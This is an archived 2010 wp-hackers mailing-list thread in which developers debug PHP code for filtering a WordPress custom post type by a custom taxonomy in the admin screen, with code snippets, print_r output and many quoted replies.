>>>>>>>    if (isset($request['post_type']) &&
>>>>>>> $request['post_type']=='ressource_fr') {
>>>>>>>            $request['taxonomy'] = 'classement_fr';
>>>>>>>            $request['term'] =
>>>>>>> get_term($request['classement-fr'],'classement_fr')->name;
>>>>>>>            unset($request['name']);
>>>>>>>    }
>>>>>>>    return $request;
>>>>>>> }
>>>>>>> 
>>>>>>> generated html :
>>>>>>> <select id="classement_fr" name="classement_fr"> <option
>> value="0">Show
>>>>>> All
>>>>>>> Classements FR</option> <option value="5">Langue oral</option>
>> <option
>>>>>> value
>>>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
>>>>>> value="8
>>>>>>> ">Niveau 3</option> </select><input type="submit"
>>>> id="post-query-submit"
>>>>>>> value="Filtrer" class="button-secondary" />
>>>>>>> _______________________________________________
>>>>>>> wp-hackers mailing list
>>>>>>> wp-hackers at lists.automattic.com
>>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>> 
>>>>>> _______________________________________________
>>>>>> wp-hackers mailing list
>>>>>> wp-hackers at lists.automattic.com
>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>> 
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jimmy.roy at gmail.com  Fri Jul 23 12:19:28 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 20:19:28 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <BCDD0CCE-A01B-459E-BE4D-FBF8CBF9ED5A@newclarity.net>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
	<AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>
	<BCDD0CCE-A01B-459E-BE4D-FBF8CBF9ED5A@newclarity.net>
Message-ID: <AANLkTi=pOK8TiDYvM6deHMfC0eF5hbqsCHWH3=rMO5tE@mail.gmail.com>

function my_request($request) {
       //if (isset($request['post_type']) &&
$request['post_type']=='ressource_fr') {
       if ( is_admin() && '/wp3.0/profperso/wp-admin/edit.php' ==
$GLOBALS['PHP_SELF'] && isset( $request['post_type'] ) &&
$request['post_type'] == 'ressource_fr' ) {
               $request['taxonomy'] = 'classement_fr';
               $request['term'] =
get_term($request['classement-fr'],'classement_fr')->name;
               print_r($request);
               unset($request['name']);
       }
       return $request;
}

it print :

Array ( [order] => asc [orderby] => menu_order title [post_type] =>
ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1
[taxonomy] => classement_fr [term] => )

term is empty, maybe it's the reason.


2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>

> Jimmy,
>
> I don't know.  You've got something about your implementation that I can't
> figure out.  Maybe someone else can.  Sorry.
>
> -Mike
>
> On Jul 23, 2010, at 7:36 AM, Jimmy Roy wrote:
>
> > actually at first it was name-classement-fr, then I change to try.
> >
> > the difference is :
> > name=classement_fr : chose a custom taxonomy andclick on filter return
> all
> > results in any case.
> > name=classement-fr : chose a custom taxonomy andclick on filter return no
> > result in any case.
> >
> > Jimmy
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr"
> whereas
> >> line 64 uses "$request['classement-fr']" and they don't match.  Change
> line
> >> 56 to be "name=classement-fr".
> >>
> >> -Mike
> >>
> >> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
> >>
> >>> Mike,
> >>> classement_fr is the name of the taxonomy.
> >>> classement-fr is the value of the query_var argument.
> >>>
> >>> Jimmy
> >>>
> >>>
> >>>
> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >>>
> >>>> Jimmy,
> >>>>
> >>>> I just noticed, '[classement_fr] => 6' is not in your array.
> >>>>
> >>>> First try to use either "classement_fr" everywhere or "classement-fr"
> >> and
> >>>> see if that fixes it.
> >>>>
> >>>> -Mike
> >>>>
> >>>> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
> >>>>
> >>>>> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> >>>>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
> >>>>>
> >>>>> url after clicking "filter" button :
> >>>>>
> >>>>>
> >>>>
> >>
> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
> >>>>>
> >>>>>
> >>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >>>>>
> >>>>>> What do you get in the view source when you using this instead:
> >>>>>>
> >>>>>> function request($request) {
> >>>>>>     print_r($request);
> >>>>>>     exit;
> >>>>>> }
> >>>>>>
> >>>>>> Also, what's your URL after clicking the "Filter" button?
> >>>>>>
> >>>>>> -Mike
> >>>>>>
> >>>>>>
> >>>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
> >>>>>>
> >>>>>>> now, when I click on filter button the result is always the same,
> all
> >>>>>> list
> >>>>>>> of ressources.
> >>>>>>>
> >>>>>>> my code :
> >>>>>>>
> >>>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
> >>>>>>>
> >>>>>>> function register_profperso_taxonomies() {
> >>>>>>>
> >>>>>>> register_taxonomy(
> >>>>>>> 'classement_fr',
> >>>>>>> array( 'ressource_fr' ),
> >>>>>>> array(
> >>>>>>> 'public' => true,
> >>>>>>> 'hierarchical' => true,
> >>>>>>> 'labels' => array(
> >>>>>>> 'name' => __( 'Classements FR' ),
> >>>>>>> 'singular_name' => __( 'Classement FR' )
> >>>>>>> ),
> >>>>>>> 'query_var' => 'classement-fr',
> >>>>>>>     'rewrite' => array( 'slug' => 'cours-fr' ),
> >>>>>>> )
> >>>>>>> );
> >>>>>>> }
> >>>>>>>
> >>>>>>>
> >>>>>>> // pour filtrer les ressources par classement
> >>>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
> >>>>>>>
> >>>>>>> function my_restrict_manage_posts() {
> >>>>>>> global $typenow;
> >>>>>>> if ($typenow=='ressource_fr')
> >>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
> >>>>>>>
> >>>>>>
> >>>>
> >>
> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
> >>>>>>> }
> >>>>>>>
> >>>>>>> add_action( 'request', 'my_request' );
> >>>>>>> function my_request($request) {
> >>>>>>>    if (isset($request['post_type']) &&
> >>>>>>> $request['post_type']=='ressource_fr') {
> >>>>>>>            $request['taxonomy'] = 'classement_fr';
> >>>>>>>            $request['term'] =
> >>>>>>> get_term($request['classement-fr'],'classement_fr')->name;
> >>>>>>>            unset($request['name']);
> >>>>>>>    }
> >>>>>>>    return $request;
> >>>>>>> }
> >>>>>>>
> >>>>>>> generated html :
> >>>>>>> <select id="classement_fr" name="classement_fr"> <option
> >> value="0">Show
> >>>>>> All
> >>>>>>> Classements FR</option> <option value="5">Langue oral</option>
> >> <option
> >>>>>> value
> >>>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
> >>>>>> value="8
> >>>>>>> ">Niveau 3</option> </select><input type="submit"
> >>>> id="post-query-submit"
> >>>>>>> value="Filtrer" class="button-secondary" />
> >>>>>>> _______________________________________________
> >>>>>>> wp-hackers mailing list
> >>>>>>> wp-hackers at lists.automattic.com
> >>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>>>
> >>>>>> _______________________________________________
> >>>>>> wp-hackers mailing list
> >>>>>> wp-hackers at lists.automattic.com
> >>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>>>
> >>>>> _______________________________________________
> >>>>> wp-hackers mailing list
> >>>>> wp-hackers at lists.automattic.com
> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From frank at bueltge.de  Fri Jul 23 12:22:46 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Fri, 23 Jul 2010 14:22:46 +0200
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTi=pOK8TiDYvM6deHMfC0eF5hbqsCHWH3=rMO5tE@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com> 
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com> 
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com> 
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com> 
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com> 
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com> 
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com> 
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com> 
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com> 
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com> 
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com> 
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
	<AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com> 
	<BCDD0CCE-A01B-459E-BE4D-FBF8CBF9ED5A@newclarity.net>
	<AANLkTi=pOK8TiDYvM6deHMfC0eF5hbqsCHWH3=rMO5tE@mail.gmail.com>
Message-ID: <AANLkTik1HiBWy5qQv6qDnGcxuC7JX_W=ogMgWoHWJUDN@mail.gmail.com>

this works fine on me:

i define the taxonomie and post_type via constant:
	define( 'FB_CPT_POST_TYPE_1', 'quotes' );
	define( 'FB_CPT_TAXONOMY_TYPE_1', 'authors' );

the two fucntion from Mike:
		function get_taxonomy_html_select($taxonomy_name, $args) {
			
			$taxonomy = get_taxonomy($taxonomy_name);
			$terms = get_terms($taxonomy_name, $args);
			$label = __( 'Show All ' . $taxonomy->label, FB_CPT_TEXTDOMAIN );
			$html = array();
			$html[] = '<select id="' . $taxonomy_name . '" name="' .
$taxonomy_name . '">';
			$html[] = '<option value="0">' . $label . '</option>';
			$this_term = $_GET[$taxonomy_name];
			foreach($terms as $term) {
				$default = ($this_term == $term->term_id ? ' selected="selected"' : '');
				$value = esc_attr($term->name);
				$value = $value . ' (' . (int)$term->count . ') ';
				$html[] = '<option value="' . $term->term_id . '"' . $default .
'>' . $value . '</option>';
			}
			$html[] = '</select>';
			return implode( "\n", $html );
		}
		
		function request($request) {
			global $pagenow;
			
			if ( is_admin() && 'edit.php' == $pagenow && isset(
$request['post_type'] ) && FB_CPT_POST_TYPE_1 == $request['post_type']
) {
				$request['taxonomy'] = FB_CPT_TAXONOMY_TYPE_1;
				$request['term'] = get_term($request[FB_CPT_TAXONOMY_TYPE_1],
FB_CPT_TAXONOMY_TYPE_1)->name;
				unset($request['name']);
				
			}
			
			return $request;
		}


On Fri, Jul 23, 2010 at 2:19 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
> function my_request($request) {
> ? ? ? //if (isset($request['post_type']) &&
> $request['post_type']=='ressource_fr') {
> ? ? ? if ( is_admin() && '/wp3.0/profperso/wp-admin/edit.php' ==
> $GLOBALS['PHP_SELF'] && isset( $request['post_type'] ) &&
> $request['post_type'] == 'ressource_fr' ) {
> ? ? ? ? ? ? ? $request['taxonomy'] = 'classement_fr';
> ? ? ? ? ? ? ? $request['term'] =
> get_term($request['classement-fr'],'classement_fr')->name;
> ? ? ? ? ? ? ? print_r($request);
> ? ? ? ? ? ? ? unset($request['name']);
> ? ? ? }
> ? ? ? return $request;
> }
>
> it print :
>
> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1
> [taxonomy] => classement_fr [term] => )
>
> term is empty, maybe it's the reason.
>
>
> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>
>> Jimmy,
>>
>> I don't know. ?You've got something about your implementation that I can't
>> figure out. ?Maybe someone else can. ?Sorry.
>>
>> -Mike
>>
>> On Jul 23, 2010, at 7:36 AM, Jimmy Roy wrote:
>>
>> > actually at first it was name-classement-fr, then I change to try.
>> >
>> > the difference is :
>> > name=classement_fr : chose a custom taxonomy andclick on filter return
>> all
>> > results in any case.
>> > name=classement-fr : chose a custom taxonomy andclick on filter return no
>> > result in any case.
>> >
>> > Jimmy
>> >
>> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >
>> >> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr"
>> whereas
>> >> line 64 uses "$request['classement-fr']" and they don't match. ?Change
>> line
>> >> 56 to be "name=classement-fr".
>> >>
>> >> -Mike
>> >>
>> >> On Jul 23, 2010, at 7:19 AM, Jimmy Roy wrote:
>> >>
>> >>> Mike,
>> >>> classement_fr is the name of the taxonomy.
>> >>> classement-fr is the value of the query_var argument.
>> >>>
>> >>> Jimmy
>> >>>
>> >>>
>> >>>
>> >>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >>>
>> >>>> Jimmy,
>> >>>>
>> >>>> I just noticed, '[classement_fr] => 6' is not in your array.
>> >>>>
>> >>>> First try to use either "classement_fr" everywhere or "classement-fr"
>> >> and
>> >>>> see if that fixes it.
>> >>>>
>> >>>> -Mike
>> >>>>
>> >>>> On Jul 23, 2010, at 6:32 AM, Jimmy Roy wrote:
>> >>>>
>> >>>>> Array ( [order] => asc [orderby] => menu_order title [post_type] =>
>> >>>>> ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1 )
>> >>>>>
>> >>>>> url after clicking "filter" button :
>> >>>>>
>> >>>>>
>> >>>>
>> >>
>> http://localhost:8888/wp3.0/profperso/wp-admin/edit.php?s&post_status=all&post_type=ressource_fr&mode=list&action=-1&m=0&classement_fr=6&action2=-1
>> >>>>>
>> >>>>>
>> >>>>> 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
>> >>>>>
>> >>>>>> What do you get in the view source when you using this instead:
>> >>>>>>
>> >>>>>> function request($request) {
>> >>>>>> ? ? print_r($request);
>> >>>>>> ? ? exit;
>> >>>>>> }
>> >>>>>>
>> >>>>>> Also, what's your URL after clicking the "Filter" button?
>> >>>>>>
>> >>>>>> -Mike
>> >>>>>>
>> >>>>>>
>> >>>>>> On Jul 23, 2010, at 6:02 AM, Jimmy Roy wrote:
>> >>>>>>
>> >>>>>>> now, when I click on filter button the result is always the same,
>> all
>> >>>>>> list
>> >>>>>>> of ressources.
>> >>>>>>>
>> >>>>>>> my code :
>> >>>>>>>
>> >>>>>>> add_action( 'init', 'register_profperso_taxonomies', 0 );
>> >>>>>>>
>> >>>>>>> function register_profperso_taxonomies() {
>> >>>>>>>
>> >>>>>>> register_taxonomy(
>> >>>>>>> 'classement_fr',
>> >>>>>>> array( 'ressource_fr' ),
>> >>>>>>> array(
>> >>>>>>> 'public' => true,
>> >>>>>>> 'hierarchical' => true,
>> >>>>>>> 'labels' => array(
>> >>>>>>> 'name' => __( 'Classements FR' ),
>> >>>>>>> 'singular_name' => __( 'Classement FR' )
>> >>>>>>> ),
>> >>>>>>> 'query_var' => 'classement-fr',
>> >>>>>>> ? ? 'rewrite' => array( 'slug' => 'cours-fr' ),
>> >>>>>>> )
>> >>>>>>> );
>> >>>>>>> }
>> >>>>>>>
>> >>>>>>>
>> >>>>>>> // pour filtrer les ressources par classement
>> >>>>>>> add_action( 'restrict_manage_posts','my_restrict_manage_posts' );
>> >>>>>>>
>> >>>>>>> function my_restrict_manage_posts() {
>> >>>>>>> global $typenow;
>> >>>>>>> if ($typenow=='ressource_fr')
>> >>>>>>> wp_dropdown_categories( 'show_option_all=Afficher
>> >>>>>>>
>> >>>>>>
>> >>>>
>> >>
>> tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
>> >>>>>>> }
>> >>>>>>>
>> >>>>>>> add_action( 'request', 'my_request' );
>> >>>>>>> function my_request($request) {
>> >>>>>>> ? ?if (isset($request['post_type']) &&
>> >>>>>>> $request['post_type']=='ressource_fr') {
>> >>>>>>> ? ? ? ? ? ?$request['taxonomy'] = 'classement_fr';
>> >>>>>>> ? ? ? ? ? ?$request['term'] =
>> >>>>>>> get_term($request['classement-fr'],'classement_fr')->name;
>> >>>>>>> ? ? ? ? ? ?unset($request['name']);
>> >>>>>>> ? ?}
>> >>>>>>> ? ?return $request;
>> >>>>>>> }
>> >>>>>>>
>> >>>>>>> generated html :
>> >>>>>>> <select id="classement_fr" name="classement_fr"> <option
>> >> value="0">Show
>> >>>>>> All
>> >>>>>>> Classements FR</option> <option value="5">Langue oral</option>
>> >> <option
>> >>>>>> value
>> >>>>>>> ="6">Niveau 1</option> <option value="7">Niveau 2</option> <option
>> >>>>>> value="8
>> >>>>>>> ">Niveau 3</option> </select><input type="submit"
>> >>>> id="post-query-submit"
>> >>>>>>> value="Filtrer" class="button-secondary" />
>> >>>>>>> _______________________________________________
>> >>>>>>> wp-hackers mailing list
>> >>>>>>> wp-hackers at lists.automattic.com
>> >>>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>>>
>> >>>>>> _______________________________________________
>> >>>>>> wp-hackers mailing list
>> >>>>>> wp-hackers at lists.automattic.com
>> >>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>>>
>> >>>>> _______________________________________________
>> >>>>> wp-hackers mailing list
>> >>>>> wp-hackers at lists.automattic.com
>> >>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>>> _______________________________________________
>> >>>> wp-hackers mailing list
>> >>>> wp-hackers at lists.automattic.com
>> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>>>
>> >>> _______________________________________________
>> >>> wp-hackers mailing list
>> >>> wp-hackers at lists.automattic.com
>> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Fri Jul 23 12:32:05 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Fri, 23 Jul 2010 20:32:05 +0800
Subject: [wp-hackers] Custom Post Type in Admin,
	filter by new custom 	Taxonomies
In-Reply-To: <AANLkTik1HiBWy5qQv6qDnGcxuC7JX_W=ogMgWoHWJUDN@mail.gmail.com>
References: <AANLkTinDtt9tMrVLU0Jxd0vEYUYviw-88AtwaCIM3_q4@mail.gmail.com>
	<AANLkTikJCbyEb461CNkPVg9YKC9nwCZ44HVMIGVm5Y9F@mail.gmail.com>
	<AANLkTimVYzMUfv0LPpYnPgnfsz9_UaWdzMp8fm9iEkW4@mail.gmail.com>
	<75E9AFF5-9953-40A1-872D-CB7685E7D4BD@newclarity.net>
	<AANLkTinDBIEpzplIZC9qvZCgk3i1PDmaudTbOOay_2d5@mail.gmail.com>
	<030E4B32-6EA0-4991-B92F-6CEEF847725C@newclarity.net>
	<AANLkTin_UglTEsVsqQ623jQSOVAQG3wcyAJlaCZmHtm0@mail.gmail.com>
	<AANLkTi=eN2MrRMTkhS9P_amg9v5jresAHv8oNSB7mj1x@mail.gmail.com>
	<AANLkTi=mascEJuCGo1na2bm3f_M8ZRsBnMVT52tj09eF@mail.gmail.com>
	<C8A042B8-A7EC-428B-929C-C23D13D06B6A@newclarity.net>
	<AANLkTi=JufzLS7L268+SZPn0VWeKewV7zQXP1U4eL9s=@mail.gmail.com>
	<AANLkTikpZH5yx6cpTLuCXpw=imHGMeWkcZgXEfSnc2YW@mail.gmail.com>
	<6EAFDBD0-2AD1-43A7-AB89-17B288E9A6C8@newclarity.net>
	<AANLkTik58ZoOPrWqn4BjsZqE8ovD7ZVhwpk0sJc8Loa_@mail.gmail.com>
	<3BD08F18-7C61-4092-8C11-795BC1EF3FC0@newclarity.net>
	<AANLkTikPOhcktD-Gk9VN4h8zvExGRT3F=TZHv+Q-2YmQ@mail.gmail.com>
	<E5CCD001-9745-4D78-B44D-22DB79487DB7@newclarity.net>
	<AANLkTikbiOWsQAQ=7YAHUGBky3vGvZs=D+FbivKDZzMb@mail.gmail.com>
	<BCDD0CCE-A01B-459E-BE4D-FBF8CBF9ED5A@newclarity.net>
	<AANLkTi=pOK8TiDYvM6deHMfC0eF5hbqsCHWH3=rMO5tE@mail.gmail.com>
	<AANLkTik1HiBWy5qQv6qDnGcxuC7JX_W=ogMgWoHWJUDN@mail.gmail.com>
Message-ID: <AANLkTikeAjOcg77a_zK2xE-CnRgfKPUtYdpaWbYXhNsL@mail.gmail.com>

for me it change nothing :

add_action( 'restrict_manage_posts','my_restrict_manage_posts' );

function my_restrict_manage_posts() {
global $typenow;
if ($typenow=='ressource_fr')
echo get_taxonomy_html_select( 'classement_fr' );
//wp_dropdown_categories( 'show_option_all=Afficher
tout&show_count=1&hierarchical=1&taxonomy=classement_fr&name=classement_fr');
}

add_action( 'request', 'my_request' );
function my_request($request) {
       //if (isset($request['post_type']) &&
$request['post_type']=='ressource_fr') {
       if ( is_admin() && '/wp3.0/profperso/wp-admin/edit.php' ==
$GLOBALS['PHP_SELF'] && isset( $request['post_type'] ) &&
$request['post_type'] == 'ressource_fr' ) {
               $request['taxonomy'] = 'classement_fr';
               $request['term'] =
get_term($request['classement_fr'],'classement_fr')->name;
               unset($request['name']);
       }
       return $request;
}

function get_taxonomy_html_select($taxonomy_name) {
$taxonomy = get_taxonomy($taxonomy_name);
$terms = get_terms($taxonomy_name);
$label = __("Afficher tout {$taxonomy->label}");
$html = array();
$html[] = "<select id=\"$taxonomy_name\" name=\"$taxonomy_name\">";
$html[] = "<option value=\"0\">$label</option>";
$this_term = $_GET[$taxonomy_name];
foreach($terms as $term) {
$default = ($this_term==$term->term_id ? ' selected="selected"' : '');
$value = esc_attr($term->name);
$html[] = "<option value=\"{$term->term_id}\"$default>$value</option>";
}
$html[] = "</select>";
return implode("\n",$html);
}

same result : no result.

this is the request when I select a taxonomy and click on filter button :

Array ( [order] => asc [orderby] => menu_order title [post_type] =>
ressource_fr [classement_fr] => 6 [taxonomy] => classement_fr [term] =>
Niveau 1 [posts_per_page] => -1 [posts_per_archive_page] => -1 )

term is empty.
same for u?


2010/7/23 Frank Bueltge <frank at bueltge.de>

> this works fine on me:
>
> i define the taxonomie and post_type via constant:
>        define( 'FB_CPT_POST_TYPE_1', 'quotes' );
>        define( 'FB_CPT_TAXONOMY_TYPE_1', 'authors' );
>
> the two fucntion from Mike:
>                function get_taxonomy_html_select($taxonomy_name, $args) {
>
>                        $taxonomy = get_taxonomy($taxonomy_name);
>                         $terms = get_terms($taxonomy_name, $args);
>                        $label = __( 'Show All ' . $taxonomy->label,
> FB_CPT_TEXTDOMAIN );
>                         $html = array();
>                        $html[] = '<select id="' . $taxonomy_name . '"
> name="' .
> $taxonomy_name . '">';
>                        $html[] = '<option value="0">' . $label .
> '</option>';
>                        $this_term = $_GET[$taxonomy_name];
>                        foreach($terms as $term) {
>                                $default = ($this_term == $term->term_id ? '
> selected="selected"' : '');
>                                $value = esc_attr($term->name);
>                                 $value = $value . ' (' . (int)$term->count
> . ') ';
>                                 $html[] = '<option value="' .
> $term->term_id . '"' . $default .
> '>' . $value . '</option>';
>                        }
>                        $html[] = '</select>';
>                        return implode( "\n", $html );
>                }
>
>                 function request($request) {
>                        global $pagenow;
>
>                        if ( is_admin() && 'edit.php' == $pagenow && isset(
> $request['post_type'] ) && FB_CPT_POST_TYPE_1 == $request['post_type']
> ) {
>                                $request['taxonomy'] =
> FB_CPT_TAXONOMY_TYPE_1;
>                                $request['term'] =
> get_term($request[FB_CPT_TAXONOMY_TYPE_1],
> FB_CPT_TAXONOMY_TYPE_1)->name;
>                                 unset($request['name']);
>
>                        }
>
>                        return $request;
>                }
>
>
> On Fri, Jul 23, 2010 at 2:19 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
> > function my_request($request) {
> >       //if (isset($request['post_type']) &&
> > $request['post_type']=='ressource_fr') {
> >       if ( is_admin() && '/wp3.0/profperso/wp-admin/edit.php' ==
> > $GLOBALS['PHP_SELF'] && isset( $request['post_type'] ) &&
> > $request['post_type'] == 'ressource_fr' ) {
> >               $request['taxonomy'] = 'classement_fr';
> >               $request['term'] =
> > get_term($request['classement-fr'],'classement_fr')->name;
> >               print_r($request);
> >               unset($request['name']);
> >       }
> >       return $request;
> > }
> >
> > it print :
> >
> > Array ( [order] => asc [orderby] => menu_order title [post_type] =>
> > ressource_fr [posts_per_page] => -1 [posts_per_archive_page] => -1
> > [taxonomy] => classement_fr [term] => )
> >
> > term is empty, maybe it's the reason.
> >
> >
> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >
> >> Jimmy,
> >>
> >> I don't know.  You've got something about your implementation that I
> can't
> >> figure out.  Maybe someone else can.  Sorry.
> >>
> >> -Mike
> >>
> >> On Jul 23, 2010, at 7:36 AM, Jimmy Roy wrote:
> >>
> >> > actually at first it was name-classement-fr, then I change to try.
> >> >
> >> > the difference is :
> >> > name=classement_fr : chose a custom taxonomy andclick on filter return
> >> all
> >> > results in any case.
> >> > name=classement-fr : chose a custom taxonomy andclick on filter return
> no
> >> > result in any case.
> >> >
> >> > Jimmy
> >> >
> >> > 2010/7/23 Mike Schinkel <mikeschinkel at newclarity.net>
> >> >
> >> >> In http://pastebin.com/PL1FWtcs line 56 uses "name=classement_fr"
> >> whereas
